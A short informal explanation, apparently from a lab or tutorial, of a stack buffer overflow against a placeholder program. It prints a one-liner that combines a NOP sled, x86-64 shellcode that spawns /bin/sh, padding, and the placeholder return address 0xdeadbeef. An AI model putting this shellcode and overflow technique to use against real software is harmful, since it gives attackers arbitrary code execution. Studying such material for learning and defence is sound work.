so this is how you do the overflow with the no op sled down to the shellcode execution

python -c “print(‘\x90’ * 30 + ‘\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05’ +‘\x41’ * 60 + ‘\xef\xbe\xad\xde’) | ./program_name”

no ops are at the start which lead down the sled to the shellcode execution, then theres some padding after the shellcode just to pad it out so we can overwrite the address back to where we want it
